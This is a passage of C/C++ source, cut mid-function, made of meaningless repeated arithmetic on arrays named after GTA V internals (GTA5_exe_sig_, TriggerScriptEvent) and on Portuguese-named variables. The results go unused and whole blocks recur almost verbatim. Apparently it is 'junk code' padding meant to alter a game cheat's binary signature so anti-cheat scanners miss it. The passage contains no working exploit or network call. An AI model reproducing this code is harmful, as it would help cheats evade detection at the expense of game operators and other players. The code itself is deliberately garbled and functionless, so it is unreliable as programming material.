			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			if (Modelo == "")
			{
				i = 1000;
			}
			else
			{

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
